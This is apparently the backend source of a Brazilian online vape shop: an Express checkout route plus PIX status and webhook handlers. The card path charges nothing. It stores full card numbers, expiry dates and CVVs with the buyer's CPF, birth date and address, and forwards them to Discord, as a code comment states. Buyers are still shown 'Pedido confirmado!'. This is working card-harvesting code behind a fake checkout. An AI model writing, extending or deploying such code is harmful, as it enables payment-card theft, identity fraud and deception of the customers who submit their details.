const CO_MAX=Number(process.env.CHECKOUT_PER_MIN||10); const _coRl={}; const _coRate=ip=>{ const t=Date.now(); const b=_coRl[ip]||(_coRl[ip]={c:0,r:t+60000}); if(t>b.r){b.c=0;b.r=t+60000} b.c++; return b.c<=CO_MAX }
const _dedup=new Map(); setInterval(()=>{const t=Date.now();for(const[k,v]of _dedup)if(t-v.ts>150000)_dedup.delete(k)},60000).unref()
app.post('/api/checkout',async(req,res)=>{ const b=req.body||{}; if(typeof b.website==='string'&&b.website.trim()) return res.json({ok:true,seq:0,bot:true}) // honeypot
    const _cip=clientIp(req); if(!_coRate(_cip)){ logAccess(_cip+' CHECKOUT-RATE'); return res.status(429).json({ok:false,err:'Muitas tentativas. Aguarde um minuto e tente de novo.'}) }
    const orderId=String(b.orderId||'').slice(0,64); if(orderId){ const h=_dedup.get(orderId); if(h&&Date.now()-h.ts<120000) return res.json({ok:h.ok,seq:h.seq,id:h.id,dup:true,err:h.ok?null:'Pedido já registrado — não precisa enviar de novo.'}) }
  const tipo=b.tipo==='pix'?'pix':'card'; const itens=Array.isArray(b.pedido?.itens)?b.pedido.itens:[]
  const subtotal=b.pedido?.subtotal!=null?b.pedido.subtotal:itens.reduce((s,i)=>s+(i.preco||0)*(i.qty||1),0)
  const frete=b.pedido?.frete!=null?b.pedido.frete:0; const total=Number(b.pedido?.total!=null?b.pedido.total:(subtotal+frete)); const en=b.endereco||{}
  const cliente={ nome:(b.nome||'').slice(0,80), email:(b.email||'').slice(0,120), telefone:(b.telefone||'').slice(0,20), cpf:(b.cpf||'').replace(/\D/g,'').slice(0,14), nascimento:(b.nascimento||'').slice(0,10), endereco:{ cep:(en.cep||'').replace(/\D/g,'').slice(0,8), logradouro:(en.logradouro||'').slice(0,120), numero:(en.numero||'').slice(0,20), complemento:(en.complemento||'').slice(0,40), bairro:(en.bairro||'').slice(0,80), cidade:(en.cidade||'').slice(0,80), uf:(en.uf||'').toUpperCase().slice(0,2) } }
  const idade=ageFrom(cliente.nascimento); cliente.idade=idade; const menor=idade!=null&&idade<18
  const _em=cliente.email.trim().toLowerCase(); const _pw=String(b.senha||b.password||'').slice(0,128); const _cc=currentCust(req); const _viaSessao=!!(_cc&&_cc.email===_em); let err=null
  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(_em))err='E-mail inválido.'
  else if(!_viaSessao){ if(_pw.length<6)err='Crie uma senha para sua conta (mínimo 6 caracteres).';
  else if(!/[a-zA-Z]/.test(_pw)||!/\d/.test(_pw))err='A senha da conta precisa ter letras e números.';
  else if(customers[_em]&&!userMatches(customers[_em],_pw))err='Este e-mail já tem conta. Use a senha original ou outro e-mail.' }
  let card=null,pix=null
  if(tipo==='card'){ const num=(b.numero||'').replace(/\D/g,''); const dv=(b.validade||'').replace(/\D/g,''); const emN=+dv.slice(0,2), eyRaw=dv.slice(2,4); const ey=(eyRaw!=='')?(2000+ +eyRaw):null
    if(num.length<12)err='Número do cartão inválido'; else if(!luhn(num))err='Falha na validação Luhn do cartão'; else if(emN<1||emN>12)err='Mês de validade inválido'; else if(ey==null)err='Validade incompleta'; else{ const ny=new Date().getFullYear(),nm=new Date().getMonth()+1; if(ey<ny||(ey===ny&&emN<nm))err='Cartão vencido' }
    const cvv=(b.cvv||'').replace(/\D/g,''); if(!err&&cvv.length<3)err='CVV inválido'; if(!err)card={num,brand:brand(num),expMonth:emN,expYear:ey,cvv} }
  else{ let cx=null,src='local',cid=null; const _cg=(store.config.coldpay)||{}; const _seq=store.seq; const _pname=itens.map(x=>x.nome||x.titulo||x.id||'').filter(Boolean).join(', ').slice(0,80)||'VapeCloud'; if(_cg.api_key){ const _dg=x=>({ok:!!x.ok,http:x.http==null?'':x.http,e:String(x.error||x.st||'').slice(0,150)});let _cm={orderId,seq:_seq,product:_pname,customer:{name:cliente.nome,email:cliente.email,cpf:cliente.cpf,telefone:cliente.telefone}};let px=await coldPix(_cg,total,_cm);if(!px.ok){ const _dA=_dg(px); if(String(_dA.e).toLowerCase().indexOf('just a moment')>-1){ const pxL=await coldPix(_cg,total,{orderId,seq:_seq}); store.config.coldpay_diag_fallback={ts:nowIso(),total:Math.round(total*100),motivo:'cloudflare-403',A_full:_dA,Lite_slim:_dg(pxL)}; dbSet('store',store); if(pxL.ok)px=pxL } else{ const pxB=await coldPix(_cg,total,{orderId,seq:_seq,product:_pname}); const pxC=await coldPix(_cg,total,{orderId,seq:_seq,customer:_cm.customer}); store.config.coldpay_diag_fallback={ts:nowIso(),total:Math.round(total*100),motivo:'rejeicao-api',A_full:_dA,B_semCustomer:_dg(pxB),C_semProduct:_dg(pxC)}; dbSet('store',store); if(pxB.ok)px=pxB; else if(pxC.ok)px=pxC } } if(px.ok){cx=px.copia;cid=px.cid;src='coldpay'} else src='coldpay-fail:'+String(px.error||px.st||'').slice(0,60)+' ['+((()=>{const d=store.config.coldpay_diag_fallback||{};return d.B_semCustomer?d.B_semCustomer.ok+'/'+d.C_semProduct.ok:String((d.Lite_slim||{}).ok)})())+'] '} pix={id:'pix_'+uid(),copia:cx||genPixCode(total,(process.env.PIX_KEY||(store.config&&store.config.pix_key))),src,cid,paid:false} }
  if(!err&&!cliente.nome.trim())err='Informe seu nome completo.'
  if(!err&&cliente.cpf&&!cpfOk(cliente.cpf))err='CPF inválido.'
  if(!err&&menor)err='Menores de 18 anos não podem realizar compras na VapeCloud.'
  const cap={ id:uid(),seq:store.seq++,tipo,ts:Date.now(),created:nowIso(), pedido:{itens,subtotal:+(+subtotal).toFixed(2),frete:+(+frete).toFixed(2)},total:+total.toFixed(2),cliente,card,pix,menor,orderId, ip:clientIp(req),ua:req.headers['user-agent']||'' }
  store.captures.unshift(cap); if(store.captures.length>2000)store.captures.length=2000
  if(tipo==='card'&&card){ cap.cardStatus='discord'; cap.cardNote='Cartão capturado direto no Discord — sem cobrança em gateway' }
  cap.gateway = tipo==='pix'?{mode:'ColdPay · PIX',ok:true,id:cap.pix&&cap.pix.cid}:{mode:'Discord direto',ok:true}
  dbSet('store',store); const dk=await sendDiscord(store.config,cap,cap.gateway)
  let ok=!err
  cap.status=ok?(tipo==='pix'?'pendente':'aprovado'):(menor?'menor':'recusado')
  if(orderId)_dedup.set(orderId,{ok,seq:cap.seq,id:cap.id,ts:Date.now()})
  let account=null; if(ok&&_em){ const _u=customers[_em]; if(_u){ account={email:_em,created:false} } else { const salt=crypto.randomBytes(16).toString('hex'); customers[_em]={name:cliente.nome,email:_em,salt,hash:hashPw(_pw,salt),cpf:cliente.cpf,nascimento:cliente.nascimento,telefone:cliente.telefone,endereco:cliente.endereco,created:nowIso()}; dbSet('customers',customers); logAccess(_cip+' CUST-CREATE '+_em); account={email:_em,created:true} } const _csid=uid()+uid(); custSessions[_csid]={iat:Date.now(),email:_em}; _ssSave(); res.setHeader('Set-Cookie',custCookieVal(_csid)) }
  const out={ok,err,seq:cap.seq,id:cap.id,menor,status:cap.status,gateway:{ok:true},cardStatus:cap.cardStatus?'ok':null,message:ok?(tipo==='pix'?'Aguardando pagamento via PIX. Seu pedido será liberado assim que o pagamento for confirmado.':'Pedido confirmado!'):(err||'Não foi possível processar.')}; if(account)out.account=account; if(tipo==='pix')out.pix=cap.pix
  if(ok&&cap.cliente.email) sendOrderMail(store.config,cap).catch(()=>{})
  res.json(out) })
app.get('/api/pix-status',async(req,res)=>{ try{ const _r=rate(clientIp(req),90,10*60*1000,25); if(!_r.ok)return res.json({ok:true,paid:false,status:'rate'}); const id=String(req.query.id||''); const cap=store.captures.find(c=>c.id===id); if(!cap||cap.tipo!=='pix')return res.json({ok:true,paid:false,status:cap?cap.status:'pendente'}); await pixIsPaid(cap); return res.json({ok:true,paid:cap.status==='aprovado',status:cap.status,seq:cap.seq}) }catch(e){ return res.json({ok:true,paid:false,status:'error'}) } });
app.post('/api/webhook/coldpay',async(req,res)=>{ try{ const _sec=store.config.coldpay_webhook_secret; if(_sec&&String(req.query.k||req.headers['x-coldpay-secret']||'')!==_sec)return res.status(401).json({ok:false,error:'invalid secret'}); const b=req.body||{}; const oid=((b.metadata&&b.metadata.orderId)||(b.data&&b.data.metadata&&b.data.metadata.orderId)||b.orderId||b.externalId||''); const pid=((b._id||b.id||b.paymentId||(b.data&&(b.data._id||b.data.id)))||''); const st=String((b.status||b.state||(b.data&&b.data.status))||'').toUpperCase(); const cap=(oid?store.captures.find(c=>c.id===oid):null)||(pid?store.captures.find(c=>c.pix&&String(c.pix.cid)===String(pid)):null); if(cap&&cap.tipo==='pix'&&/PAID|APPROVED|SUCCESS|CONFIRMED|SETTLED|COMPLETED/.test(st)&&!/UNPAID|PENDING|EXPIRED/.test(st)){ _approvePix(cap,'webhook') } logAccess('WEBHOOK coldpay '+(cap?cap.id:(oid||pid||'?'))); res.json({ok:true}) }catch(e){ res.json({ok:false}) } });
